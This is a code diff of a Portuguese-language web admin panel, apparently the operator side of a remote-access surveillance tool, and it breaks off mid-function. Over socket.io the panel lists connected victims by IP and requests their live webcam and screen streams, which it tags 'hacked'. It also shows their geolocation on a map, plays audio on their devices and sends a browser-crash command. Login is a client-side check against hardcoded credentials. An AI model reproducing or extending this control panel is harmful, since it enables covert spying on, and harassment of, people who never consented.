@@ -10,6 +10,7 @@
 --[[ 𝐩𝐚𝐫𝐚𝐛𝐞𝐧𝐬 𝐯𝐨𝐜𝐞 𝐚𝐜𝐞𝐬𝐬𝐨𝐮 𝐨 𝐩𝐚𝐢𝐧𝐞𝐥 𝐚𝐝𝐦 𝐝𝐞𝐬𝐜𝐨𝐛𝐫𝐞 𝐚 𝐬𝐞𝐧𝐡𝐚 𝐚𝐠𝐨𝐫𝐚 𝐪 𝐬𝐞 𝐞𝐧𝐭𝐫𝐚 --]]
 -->
 
+<!-- Sukita is the main of DL – v2.4 -->
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -17,7 +18,9 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Sukita is the main of DL</title>
 
+  <!-- Ícone -->
   <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRt0Knrsk0bL7_3EMrM_TE7G5GCp6RDVgMdRQ&s" type="image/png">
+
   <!-- Bootstrap · FontAwesome · Animate.css -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
@@ -31,12 +34,18 @@
     /* ─────────── Tema Neon-Pulse ─────────── */
     :root{
       --bg1:#0b0d13; --bg2:#131720; --stroke:#212837;
-      --txt:#ced3e6; --muted:#828ca3; --accent:#a809bd; --accent2:#e29608; --danger:#ff3b3b;
+      --txt:#ced3e6; --muted:#828ca3; --accent:#a809bd;
+      --accent2:#e29608; --danger:#ff3b3b;
       --radius:.8rem; --mono:'Fira Code',monospace; --sans:'Montserrat',sans-serif;
       --shadow:0 12px 32px -14px rgba(0,0,0,.8);
     }
     @keyframes gradientShift{0%{background-position:0 0}50%{background-position:400% 0}100%{background-position:0 0}}
-    html,body{height:100%;margin:0;background:linear-gradient(120deg,#1d0524 0%,#021b2c 25%,#0b0124 50%,#021b2c 75%,#1d0524 100%);background-size:400% 400%;animation:gradientShift 28s ease infinite;font-family:var(--sans);color:var(--txt);}
+    html,body{
+      height:100%;margin:0;
+      background:linear-gradient(120deg,#1d0524 0%,#021b2c 25%,#0b0124 50%,#021b2c 75%,#1d0524 100%);
+      background-size:400% 400%;animation:gradientShift 28s ease infinite;
+      font-family:var(--sans);color:var(--txt);
+    }
     body.locked{overflow:hidden}
     *::-webkit-scrollbar{width:6px;height:6px}
     *::-webkit-scrollbar-thumb{background:var(--accent2);border-radius:3px}
@@ -53,34 +62,80 @@
 
     /* Login */
     #login{display:flex;align-items:center;justify-content:center;height:100vh}
-    .login-card{background:var(--bg2);border:1px solid var(--stroke);border-radius:var(--radius);box-shadow:var(--shadow);padding:2.5rem 3rem;width:100%;max-width:420px}
+    .login-card{
+      background:var(--bg2);border:1px solid var(--stroke);border-radius:var(--radius);
+      box-shadow:var(--shadow);padding:2.5rem 3rem;width:100%;max-width:420px
+    }
     .login-card h4{font-family:var(--mono);color:var(--accent2)}
-    .login-card input{background:var(--bg1);border:1px solid var(--stroke);color:var(--txt);border-radius:.45rem;font-family:var(--mono)}
+    .login-card input{
+      background:var(--bg1);border:1px solid var(--stroke);color:var(--txt);
+      border-radius:.45rem;font-family:var(--mono)
+    }
     .login-card input:focus{border-color:var(--accent)}
+    .form-check-input:checked{background-color:var(--accent);border-color:var(--accent)}
 
     /* Navbar */
-    .navbar{background:rgba(0,0,0,.45);backdrop-filter:blur(6px);border-bottom:1px solid var(--stroke);box-shadow:var(--shadow)}
+    .navbar{
+      background:rgba(0,0,0,.45);backdrop-filter:blur(6px);
+      border-bottom:1px solid var(--stroke);box-shadow:var(--shadow)
+    }
     .navbar-brand{font-family:var(--mono);font-weight:600;color:var(--accent2)}
 
     /* Sidebar */
-    .sidebar{width:240px;background:rgba(0,0,0,.45);backdrop-filter:blur(6px);border-right:1px solid var(--stroke)}
-    .client-row{display:flex;align-items:center;gap:.6rem;padding:.5rem .9rem;margin:.12rem .5rem;border-radius:calc(var(--radius)-.25rem);cursor:pointer;font-size:.86rem;font-family:var(--mono);transition:background .15s}
+    .sidebar{
+      width:240px;background:rgba(0,0,0,.45);backdrop-filter:blur(6px);
+      border-right:1px solid var(--stroke)
+    }
+    .client-row{
+      display:flex;align-items:center;gap:.6rem;padding:.5rem .9rem;margin:.12rem .5rem;
+      border-radius:calc(var(--radius)-.25rem);cursor:pointer;font-size:.86rem;
+      font-family:var(--mono);transition:background .15s
+    }
     .client-row:hover{background:rgba(0,224,255,.07)}
     .client-row i{width:22px;text-align:center;color:var(--accent2)}
 
     /* Viewer cards */
-    #viewer{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1.4rem;padding:1.6rem;overflow-y:auto}
-    .card-feed{position:relative;border-radius:var(--radius);overflow:hidden;border:1px solid var(--stroke);background:var(--bg2);box-shadow:var(--shadow);transition:transform .25s,box-shadow .25s}
+    #viewer{
+      display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));
+      gap:1.4rem;padding:1.6rem;overflow-y:auto
+    }
+    .card-feed{
+      position:relative;border-radius:var(--radius);overflow:hidden;border:1px solid var(--stroke);
+      background:var(--bg2);box-shadow:var(--shadow);
+      transition:transform .25s,box-shadow .25s
+    }
     .card-feed:hover{transform:translateY(-6px) scale(1.02);box-shadow:0 18px 32px -10px rgba(0,224,255,.35)}
     .card-feed img{display:block;width:100%;height:200px;object-fit:cover;filter:brightness(.9)}
-    .ip-label{position:absolute;top:0;left:0;width:100%;padding:.28rem .5rem;font-size:.75rem;background:rgba(0,0,0,.8);border-bottom:1px solid var(--stroke);text-align:center;font-family:var(--mono);color:var(--accent2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-    .overlay{position:absolute;bottom:.5rem;left:.6rem;background:rgba(0,0,0,.65);padding:.22rem .65rem;border-radius:.35rem;font-size:.72rem;font-family:var(--mono)}
+    .ip-label{
+      position:absolute;top:0;left:0;width:100%;padding:.28rem .5rem;font-size:.75rem;
+      background:rgba(0,0,0,.8);border-bottom:1px solid var(--stroke);text-align:center;
+      font-family:var(--mono);color:var(--accent2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis
+    }
+    .overlay{
+      position:absolute;bottom:.5rem;left:.6rem;background:rgba(0,0,0,.65);padding:.22rem .65rem;
+      border-radius:.35rem;font-size:.72rem;font-family:var(--mono)
+    }
     .btn-bar{position:absolute;top:calc(28px + .6rem);right:.8rem;display:flex;gap:.45rem}
-    .btn-glass{width:36px;height:36px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%;background:rgba(255,0,124,.12);border:1px solid rgba(255,0,124,.35);color:var(--accent);backdrop-filter:blur(3px);transition:background .15s,border .15s}
+    .btn-glass{
+      width:36px;height:36px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%;
+      background:rgba(255,0,124,.12);border:1px solid rgba(255,0,124,.35);color:var(--accent);
+      backdrop-filter:blur(3px);transition:background .15s,border .15s
+    }
     .btn-glass:hover{background:rgba(255,0,124,.22);border-color:rgba(255,0,124,.55)}
 
     /* Menu botões */
-    .menu-btn{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:1.1rem .5rem;border-radius:var(--radius);background:rgba(0,224,255,.1);border:1px dashed var(--accent2);color:var(--txt);font-family:var(--mono);font-size:.9rem;gap:.55rem;cursor:pointer;transition:all .18s;text-decoration:none}
+    .menu-box{
+      background:var(--bg2);border:1px solid var(--stroke);border-radius:var(--radius);
+      box-shadow:var(--shadow);padding:2rem 2.5rem;min-width:320px;max-height:80vh;overflow-y:auto
+    }
+    .menu-box h5{color:var(--accent);font-family:var(--mono);margin-bottom:1.4rem;text-align:center}
+    .menu-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:1rem}
+    .menu-btn{
+      display:flex;flex-direction:column;align-items:center;justify-content:center;padding:1rem .5rem;
+      border-radius:var(--radius);background:rgba(0,224,255,.1);border:1px dashed var(--accent2);
+      color:var(--txt);font-family:var(--mono);font-size:.9rem;gap:.55rem;cursor:pointer;
+      transition:all .18s;text-decoration:none
+    }
     .menu-btn i{font-size:1.5rem;color:var(--accent2)}
     .menu-btn:hover{background:rgba(0,224,255,.18);transform:translateY(-3px) scale(1.03);box-shadow:0 8px 18px -8px rgba(0,224,255,.4)}
     .danger-btn{background:rgba(255,59,59,.1);border-color:var(--danger);color:var(--danger)}
@@ -88,7 +143,10 @@
     .danger-btn:hover{background:rgba(255,59,59,.2)}
     .info-btn{background:rgba(0,224,255,.1);border-color:var(--accent2);color:var(--accent2)}
     .info-btn:hover{background:rgba(0,224,255,.18)}
-    .close-x{position:absolute;top:1.1rem;right:1.3rem;background:none;border:none;color:var(--muted);font-size:1.4rem;cursor:pointer}
+    .close-x{
+      position:absolute;top:1.1rem;right:1.3rem;background:none;border:none;color:var(--muted);
+      font-size:1.4rem;cursor:pointer
+    }
     .close-x:hover{color:var(--accent)}
 
     /* Toast */
@@ -99,27 +157,39 @@
     /* overlays/bubble */
     .overlay-back{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:8000}
     .overlay-back.show{display:flex}
-    .menu-box{background:var(--bg2);border:1px solid var(--stroke);border-radius:var(--radius);box-shadow:var(--shadow);padding:2rem 2.5rem;min-width:320px}
-    .menu-box h5{color:var(--accent);font-family:var(--mono);margin-bottom:1.4rem;text-align:center}
-    .menu-grid{display:grid;grid-template-columns:repeat(2,minmax(120px,1fr));gap:1rem}
     .fab{position:fixed;bottom:1.5rem;right:1.5rem;z-index:7500}
-    .bubble{background:linear-gradient(135deg,var(--accent2),var(--accent));padding:.65rem 1.3rem;color:#000;font-family:var(--mono);font-weight:700;border-radius:50px;cursor:pointer;display:inline-flex;align-items:center;gap:.5rem;box-shadow:var(--shadow);transition:transform .2s}
-    .bubble:hover{transform:translateY(-4px) scale(1.05)}
+    .bubble{
+      background:linear-gradient(135deg,var(--accent2),var(--accent));padding:.65rem 1.3rem;color:#000;
+      font-family:var(--mono);font-weight:700;border-radius:50px;cursor:pointer;display:inline-flex;
+      align-items:center;gap:.5rem;box-shadow:var(--shadow);transition:transform .2s
+    }
+    .bubble:hover{transform:translateY(-4px)}
 
     /* mapa no modal */
     #infoMap{height:260px;border-radius:.5rem;overflow:hidden;margin-top:.75rem}
+
+    /* Offcanvas */
+    .offcanvas{background:var(--bg2);border-left:1px solid var(--stroke)}
   </style>
 </head>
 <body class="locked">
+
   <!-- Splash -->
-  <div id="splash"><i class="fa-solid fa-book-skull"></i><span class="mt-3">Loading... <strong style="color:#e29608">Sukita is the main of DL</strong></span></div>
+  <div id="splash">
+    <i class="fa-solid fa-book-skull"></i>
+    <span class="mt-3">Loading… <strong style="color:#e29608">Sukita is the main of DL</strong></span>
+  </div>
 
   <!-- Login -->
   <div id="login">
     <div class="login-card animate__animated animate__fadeInDown">
       <h4 class="mb-4 text-center"><i class="fa-solid fa-user-shield me-2"></i>Loga ai doido</h4>
       <input id="user" class="form-control mb-3" placeholder="Usuário">
-      <input id="pass" type="password" class="form-control mb-4" placeholder="Senha">
+      <input id="pass" type="password" class="form-control mb-2" placeholder="Senha">
+      <div class="form-check mb-4">
+        <input class="form-check-input" type="checkbox" id="rememberMe">
+        <label class="form-check-label small" for="rememberMe">Lembrar o login?</label>
+      </div>
       <button class="btn btn-accent w-100 btn-login">Entrar</button>
       <div id="error" class="text-danger mt-3 d-none text-center small">Credenciais inválidas</div>
     </div>
@@ -127,7 +197,16 @@
 
   <!-- Painel -->
   <div id="panel" style="display:none;height:100vh" class="animate__animated animate__fadeIn">
-    <nav class="navbar navbar-dark px-3"><span class="navbar-brand"><i class="fa-solid fa-scarecrow"></i><strong style="color:#e29608">Sukita is the main of DL </strong><strong style="color:#3bff76">v2.3</strong></span></nav>
+    <nav class="navbar navbar-dark px-3">
+      <span class="navbar-brand">
+        <i class="fa-solid fa-scarecrow"></i>
+        <strong style="color:#e29608">Sukita is the main of DL </strong>
+        <strong style="color:#3bff76">v2.4</strong>
+      </span>
+      <button class="btn btn-outline-light btn-sm" data-bs-toggle="offcanvas" data-bs-target="#configCanvas" title="Configurações">
+        <i class="fa-solid fa-gear"></i>
+      </button>
+    </nav>
     <div class="d-flex" style="height:calc(100% - 56px)">
       <aside class="sidebar p-3">
         <h6 class="fw-semibold mb-3">Conectados agora: <span id="count" class="badge bg-accent2">0</span></h6>
@@ -139,11 +218,24 @@
     </div>
   </div>
 
+  <!-- Off-canvas Configurações -->
+  <div class="offcanvas offcanvas-end" id="configCanvas" tabindex="-1">
+    <div class="offcanvas-header">
+      <h5 class="offcanvas-title"><i class="fa-solid fa-gear me-2"></i>Configurações</h5>
+      <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas"></button>
+    </div>
+    <div class="offcanvas-body small">
+      <button id="logoutBtn" class="btn btn-outline-danger w-100">
+        <i class="fa-solid fa-right-from-bracket me-2"></i>Deslogar
+      </button>
+    </div>
+  </div>
+
   <!-- Overlay Ações -->
   <div id="actionMenu" class="overlay-back">
     <div class="menu-box position-relative">
       <button class="close-x" onclick="closeOverlay('actionMenu')"><i class="fa-solid fa-xmark"></i></button>
-      <h5 id="menuTitle">ActionMenu: </h5>
+      <h5 id="menuTitle">ActionMenu:</h5>
       <div class="menu-grid">
         <div class="menu-btn" data-action="cam"><i class="fa-solid fa-video"></i><span>Ver cam</span></div>
         <div class="menu-btn" data-action="screen"><i class="fa-solid fa-desktop"></i><span>Ver tela</span></div>
@@ -166,14 +258,20 @@
       <button class="close-x" onclick="closeOverlay('scriptsOverlay')"><i class="fa-solid fa-xmark"></i></button>
       <h5>Scripts</h5>
       <div class="d-grid gap-3">
-        <a href="https://manus.im/" target="_blank" class="menu-btn"><i class="fa-solid fa-link"></i><span>MANUS.IM</span></a>
-        <a href="https://pastebin.com/raw/mNtFVJJa" target="_blank" class="menu-btn"><i class="fa-solid fa-link"></i><span>Infos do MANUS.IM</span></a>
-        <a href="https://saporraesukita.netlify.app" target="_blank" class="menu-btn"><i class="fa-solid fa-link"></i><span>Script de tarefa <strong style="color:#c4b213">TESTING</strong></span></a>
+        <a href="https://manus.im/" target="_blank" class="menu-btn">
+          <i class="fa-solid fa-link"></i><span>MANUS.IM</span>
+        </a>
+        <a href="https://pastebin.com/raw/mNtFVJJa" target="_blank" class="menu-btn">
+          <i class="fa-solid fa-link"></i><span>Infos do MANUS.IM</span>
+        </a>
+        <a href="https://saporraesukita.netlify.app" target="_blank" class="menu-btn">
+          <i class="fa-solid fa-link"></i><span>Script de tarefa <strong style="color:#c4b213">TESTING</strong></span>
+        </a>
       </div>
     </div>
   </div>
 
-  <!-- Modal Infos (com mapa) -->
+  <!-- Modal Infos -->
   <div class="modal fade" id="infoModal" tabindex="-1">
     <div class="modal-dialog modal-dialog-centered modal-lg">
       <div class="modal-content bg-dark text-white border-0">
@@ -219,22 +317,31 @@
   <div class="modal fade" id="recordModal" tabindex="-1">
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content bg-dark text-white border-0">
-        <div class="modal-header border-0"><h5 class="modal-title">Gravar áudio</h5><button class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
+        <div class="modal-header border-0">
+          <h5 class="modal-title">Gravar áudio</h5>
+          <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+        </div>
         <div class="modal-body text-center">
-          <button id="recordBtn" class="btn btn-danger"><i class="fas fa-microphone"></i> Gravar</button>
-          <button id="stopBtn" class="btn btn-secondary d-none"><i class="fas fa-stop"></i> Parar</button>
+          <button id="recordBtn" class="btn btn-danger">
+            <i class="fas fa-microphone"></i> Gravar
+          </button>
+          <button id="stopBtn" class="btn btn-secondary d-none">
+            <i class="fas fa-stop"></i> Parar
+          </button>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- Modal Últimas Atualizações -->
-  <div class="modal fade" id="updatesModal" tabindex="-1" aria-labelledby="updatesModalLabel" aria-hidden="true">
+  <!-- Modal Atualizações -->
+  <div class="modal fade" id="updatesModal" tabindex="-1">
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content">
         <div class="modal-header">
-          <h5 class="modal-title" id="updatesModalLabel"><strong style="color:#e29608">Sukita is the main of DL <strong style="color:#4908e2">ATUALIZADO v2.3</strong></strong></h5>
-          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fechar"></button>
+          <h5 class="modal-title">
+            <strong style="color:#e29608">Sukita is the main of DL <strong style="color:#4908e2">ATUALIZADO v2.4</strong></strong>
+          </h5>
+          <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
         </div>
         <div class="modal-body">
           <ul>
@@ -252,12 +359,12 @@
     </div>
   </div>
 
-  <!-- Modal Escolher Áudio Pronto -->
+  <!-- Modal Selecionar áudio -->
   <div class="modal fade" id="selectAudioModal" tabindex="-1">
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content bg-dark text-white border-0">
         <div class="modal-header border-0">
-          <h5 class="modal-title"><i class="fa-solid fa-music me-2"></i>Enviar áudio pronto</h5>
+          <h5 class="modal-title"><i class="fa-solid fa-music me-2"></i>Enviar áudio</h5>
           <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
         </div>
         <div class="modal-body">
@@ -272,260 +379,251 @@
     </div>
   </div>
 
-  <!-- Toasts -->
+  <!-- Toast container -->
   <div class="toast-container position-fixed top-0 end-0 p-3"></div>
 
-  <!-- Bubble Scripts -->
-  <div class="fab"><div class="bubble" id="scriptsBubble"><i class="fa-solid fa-code"></i>Acessar Scripts</div></div>
+  <!-- FAB Scripts -->
+  <div class="fab">
+    <div class="bubble" id="scriptsBubble">
+      <i class="fa-solid fa-code"></i>Acessar Scripts
+    </div>
+  </div>
 
-  <!-- File input (audio) -->
+  <!-- File input (áudio) -->
   <input type="file" id="audioFile" accept="audio/*" class="d-none">
 
-  <!-- Scripts -->
+  <!-- ========= SCRIPTS ========= -->
   <script src="/socket.io/socket.io.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script>
-    /* ======== Const e helpers ======== */
-    const socket = io({query:{role:'admin'}});
-    const $ = id => document.getElementById(id);
-    const crashModal = new bootstrap.Modal('#crashModal');
-    const infoModal  = new bootstrap.Modal('#infoModal');
-    let map, marker, mediaRecorder, chunks = [], currentUUID = null;
-    const cache = {}, activeCam = {}, activeScreen = {};
-    const toast = (m,t='primary') => {
-      const el = document.createElement('div');
-      el.className = `toast text-white bg-${t} border-0`;
-      el.innerHTML = `<div class='toast-body'>${m}</div>`;
-      document.querySelector('.toast-container').appendChild(el);
-      bootstrap.Toast.getOrCreateInstance(el,{delay:2400}).show();
-      el.addEventListener('hidden.bs.toast',()=>el.remove());
-    };
-    const os = ua => /Windows NT/.test(ua)?'Windows':/Mac OS X/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':/Linux/.test(ua)?'Linux':'—';
+  /* ===== Helpers ===== */
+  const socket = io({query:{role:'admin'}});
+  const $ = id => document.getElementById(id);
+  const TOKEN_KEY='sukita_token';
+  const toast = (msg,type='primary')=>{
+    const el=document.createElement('div');
+    el.className=`toast text-white bg-${type} border-0`;
+    el.innerHTML=`<div class='toast-body'>${msg}</div>`;
+    document.querySelector('.toast-container').appendChild(el);
+    bootstrap.Toast.getOrCreateInstance(el,{delay:2400}).show();
+    el.addEventListener('hidden.bs.toast',()=>el.remove());
+  };
+  const os = ua => /Windows NT/.test(ua)?'Windows':/Mac OS X/.test(ua)?'macOS':
+                   /Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':
+                   /Linux/.test(ua)?'Linux':'—';
 
-    /* ======== Login ======== */
-    document.querySelector('.btn-login').onclick = () => {
-      if ($('user').value.trim() === 'admin' && $('pass').value.trim() === '0312') {
-        document.body.classList.remove('locked');
-        $('login').style.display = 'none';
-        $('splash').style.display = 'flex';
-        setTimeout(() => {
-          $('splash').style.display = 'none';
-          $('panel').style.display = 'block';
-          bootstrap.Modal.getOrCreateInstance('#updatesModal').show();
-        }, 1500);
-      } else {
-        $('error').classList.remove('d-none');
+  /* ===== Splash + login persistente ===== */
+  const loginOk = ()=>{
+    document.body.classList.remove('locked');
+    $('login').style.display='none';
+    $('splash').style.display='flex';
+    setTimeout(()=>{
+      $('splash').style.display='none';
+      $('panel').style.display='block';
+      bootstrap.Modal.getOrCreateInstance('#updatesModal').show();
+    },1500);
+  };
+  if(localStorage.getItem(TOKEN_KEY)==='ok') loginOk();
+
+  document.querySelector('.btn-login').onclick = ()=>{
+    const u=$('user').value.trim(), p=$('pass').value.trim();
+    if(u==='admin' && p==='0312'){
+      if($('rememberMe').checked) localStorage.setItem(TOKEN_KEY,'ok');
+      loginOk();
+    }else $('error').classList.remove('d-none');
+  };
+  $('logoutBtn').onclick=()=>{ localStorage.removeItem(TOKEN_KEY); location.reload(); };
+
+  /* ===== Overlay helpers ===== */
+  const openOverlay = id => $(id).classList.add('show');
+  const closeOverlay = id => $(id).classList.remove('show');
+  $('scriptsBubble').onclick = ()=>openOverlay('scriptsOverlay');
+
+  /* ===== Áudios prontos (Google) ===== */
+  const readyAudios = [
+    {name:'Beep Alarm',        url:'https://actions.google.com/sounds/v1/alarms/beep_short.ogg'},
+    {name:'Alarm Clock',       url:'https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg'},
+    {name:'Spaceship Alarm',   url:'https://actions.google.com/sounds/v1/alarms/spaceship_alarm.ogg'},
+    {name:'Clown Horn',        url:'https://actions.google.com/sounds/v1/cartoon/clown_horn.ogg'}
+  ];
+  const refreshAudioList = ()=>{
+    const list=$('audioList'); list.innerHTML='';
+    readyAudios.forEach((a,i)=>{
+      list.insertAdjacentHTML('beforeend',`
+        <label class="list-group-item d-flex align-items-center gap-2">
+          <input class="form-check-input me-2" type="radio" name="readyAudio" value="${i}" ${i===0?'checked':''}>
+          <span>${a.name}</span>
+        </label>`);
+    });
+  };
+  $('sendReadyAudio').onclick=()=>{
+    const idx=[...document.querySelectorAll('input[name="readyAudio"]')].find(r=>r.checked)?.value;
+    if(idx==null) return;
+    const delay=Math.max(0,parseInt($('audioDelay').value)||0);
+    socket.emit('ready-audio',{uuid:currentUUID,url:readyAudios[idx].url,delay});
+    bootstrap.Modal.getInstance('#selectAudioModal').hide();
+    toast('Áudio enviado');
+  };
+
+  /* ===== Listagem de clientes ===== */
+  const cache={}, activeCam={}, activeScreen={};
+  socket.on('clients', arr=>{
+    $('count').textContent=arr.length;
+    $('list').innerHTML='';
+    arr.forEach(c=>{
+      cache[c.uuid]=c;
+      $('list').insertAdjacentHTML('beforeend',
+        `<div class="client-row" data-uuid="${c.uuid}">
+           <i class="fa-solid fa-eye"></i><span>${c.ip}</span>
+         </div>`);
+    });
+  });
+  socket.on('frame',d=>$('img-'+d.id)?.setAttribute('src',d.data));
+  socket.on('screen-frame',d=>$('screen-img-'+d.id)?.setAttribute('src',d.data));
+
+  /* ===== Clique no cliente ===== */
+  let currentUUID=null;
+  $('list').addEventListener('click',e=>{
+    const row=e.target.closest('.client-row'); if(!row) return;
+    currentUUID=row.dataset.uuid;
+    $('menuTitle').textContent=`Menu de: ${cache[currentUUID].ip}`;
+    openOverlay('actionMenu');
+  });
+
+  /* ===== Menu de ações ===== */
+  $('actionMenu').addEventListener('click',e=>{
+    const btn=e.target.closest('.menu-btn'); if(!btn) return;
+    const act=btn.dataset.action; closeOverlay('actionMenu');
+    switch(act){
+      case 'cam':         startStream('cam');        break;
+      case 'screen':      startStream('screen');     break;
+      case 'stop-cam':    stopStream('cam');         break;
+      case 'stop-screen': stopStream('screen');      break;
+      case 'rec-audio':   bootstrap.Modal.getOrCreateInstance('#recordModal').show(); break;
+      case 'stop-audio':  socket.emit('stop-audio',currentUUID); toast('Áudio parado','secondary'); break;
+      case 'download-audio': window.open('https://www.myinstants.com/pt/search/?name=MEME','_blank'); break;
+      case 'upload-audio': $('audioFile').click(); break;
+      case 'troll-audio': refreshAudioList(); bootstrap.Modal.getOrCreateInstance('#selectAudioModal').show(); break;
+      case 'info':        showInfo(); break;
+      case 'crash':       bootstrap.Modal.getOrCreateInstance('#crashModal').show(); break;
+    }
+  });
+
+  /* ===== Streams ===== */
+  const mkCard = (uuid,kind)=>{
+    const c=cache[uuid];
+    const card=document.createElement('div');
+    card.className='card-feed animate__animated animate__zoomIn';
+    card.id=`${kind==='cam'?'cam':'screen'}-${uuid}`;
+    card.innerHTML=`
+      <div class="ip-label">${c.ip} | ${os(c.ua)} | hacked</div>
+      <img id="${kind==='cam'?'img-'+uuid:'screen-img-'+uuid}">
+      <div class="overlay">${kind==='cam'?'Câmera':'Tela'}</div>
+      <div class="btn-bar">
+        <button class="btn-glass btn-full"><i class="fa-solid fa-expand"></i></button>
+        <button class="btn-glass btn-min"><i class="fa-solid fa-minus"></i></button>
+        <button class="btn-glass btn-stop"><i class="fa-solid fa-xmark"></i></button>
+      </div>`;
+    card.querySelector('.btn-full').onclick=()=>openFull(card);
+    card.querySelector('.btn-min').onclick=()=>{ if(document.fullscreenElement===card) document.exitFullscreen(); };
+    card.querySelector('.btn-stop').onclick=()=>{ socket.emit(kind==='cam'?'stop-stream':'stop-screen',uuid); card.remove(); };
+    $('viewer').appendChild(card);
+  };
+  const startStream = kind=>{
+    if(kind==='cam'   && activeCam[currentUUID])     {toast('Câmera já ativa','secondary');return;}
+    if(kind==='screen'&& activeScreen[currentUUID])  {toast('Tela já ativa','secondary');return;}
+    socket.emit(kind==='cam'?'request-stream':'request-screen',currentUUID);
+    (kind==='cam'?activeCam:activeScreen)[currentUUID]=true;
+    mkCard(currentUUID,kind);
+    toast(`${kind==='cam'?'Câmera':'Tela'} ativada`);
+  };
+  const stopStream = kind=>{
+    socket.emit(kind==='cam'?'stop-stream':'stop-screen',currentUUID);
+    (kind==='cam'?activeCam:activeScreen)[currentUUID]=false;
+    $(`${kind==='cam'?'cam':'screen'}-${currentUUID}`)?.remove();
+    toast(`${kind==='cam'?'Câmera':'Tela'} parada`,'secondary');
+  };
+  const openFull = card=>{
+    const img=card.querySelector('img');
+    const onFs=()=>{
+      if(document.fullscreenElement===card){
+        img.style.objectFit='contain'; img.style.height='100vh';
+      }else{
+        img.style.objectFit='cover'; img.style.height='200px';
+        document.removeEventListener('fullscreenchange',onFs);
       }
     };
+    document.addEventListener('fullscreenchange',onFs);
+    (card.requestFullscreen||card.webkitRequestFullscreen||card.msRequestFullscreen).call(card);
+  };
 
-    /* ======== Ready audios ======== */
-    const readyAudios = [
-      {name:'Rick Roll', url:'https://files.catbox.moe/9oj8bp.mp3'},
-      {name:'Goal!',     url:'https://files.catbox.moe/l7s7h0.mp3'},
-      {name:'Quero Café',url:'https://files.catbox.moe/308cxe.mp3'}
-    ];
-    function populateReadyAudios(){
-      const list = $('audioList');
-      list.innerHTML='';
-      readyAudios.forEach((a,i)=>{
-        list.insertAdjacentHTML('beforeend',`
-          <label class="list-group-item list-group-item-action d-flex align-items-center gap-2">
-            <input class="form-check-input me-2" type="radio" name="readyAudio" value="${i}" ${i===0?'checked':''}>
-            <span>${a.name}</span>
-          </label>`);
-      });
+  /* ===== Crash ===== */
+  $('confirmCrash').onclick=()=>{
+    bootstrap.Modal.getInstance('#crashModal').hide();
+    socket.emit('crash-browser',currentUUID);
+    toast('Enviando crash…','danger');
+  };
+
+  /* ===== Infos + mapa ===== */
+  let map,marker;
+  function showInfo(){
+    const c=cache[currentUUID];
+    $('infoIp').textContent=c.ip||'-';
+    $('infoUuid').textContent=c.uuid;
+    if(c.location) updateInfoFields(c.location); else
+      ['infoLat','infoLon','infoAcc','infoTime'].forEach(id=>$(id).textContent='-');
+    bootstrap.Modal.getOrCreateInstance('#infoModal').show();
+    setTimeout(initMap,200);
+  }
+  function initMap(){
+    if(map) return;
+    map=L.map('infoMap',{zoomControl:false}).setView([0,0],2);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(map);
+    marker=L.marker([0,0]).addTo(map);
+    if(cache[currentUUID].location) updateInfoFields(cache[currentUUID].location);
+  }
+  function updateInfoFields(loc){
+    $('infoLat').textContent=loc.lat.toFixed(5);
+    $('infoLon').textContent=loc.lon.toFixed(5);
+    $('infoAcc').textContent=Math.round(loc.accuracy);
+    $('infoTime').textContent=new Date(loc.timestamp).toLocaleTimeString();
+    if(map){
+      map.setView([loc.lat,loc.lon],14);
+      marker.setLatLng([loc.lat,loc.lon]).bindPopup(`Precisão ≈ ${Math.round(loc.accuracy)} m`).openPopup();
     }
+  }
 
-    $('sendReadyAudio').onclick = () => {
-      const idx = [...document.querySelectorAll('input[name="readyAudio"]')].find(r=>r.checked)?.value;
-      const delay = Math.max(0, parseInt($('audioDelay').value)||0);
-      if(idx==null) return;
-      socket.emit('ready-audio',{uuid:currentUUID,url:readyAudios[idx].url,delay});
-      bootstrap.Modal.getInstance('#selectAudioModal').hide();
-      toast('Áudio enviado','primary');
+  /* ===== Gravação de áudio ===== */
+  let mediaRecorder,chunks=[];
+  $('recordBtn').onclick=async()=>{
+    const stream=await navigator.mediaDevices.getUserMedia({audio:true});
+    mediaRecorder=new MediaRecorder(stream); chunks=[];
+    mediaRecorder.ondataavailable=e=>chunks.push(e.data);
+    mediaRecorder.onstop=()=>{
+      const delay=Math.max(0,parseInt(prompt('Atraso (segundos):','0'))||0);
+      const blob=new Blob(chunks,{type:'audio/webm'}); const fr=new FileReader();
+      fr.onload=()=>socket.emit('custom-audio',{uuid:currentUUID,dataURL:fr.result,delay});
+      fr.readAsDataURL(blob);
     };
+    mediaRecorder.start();
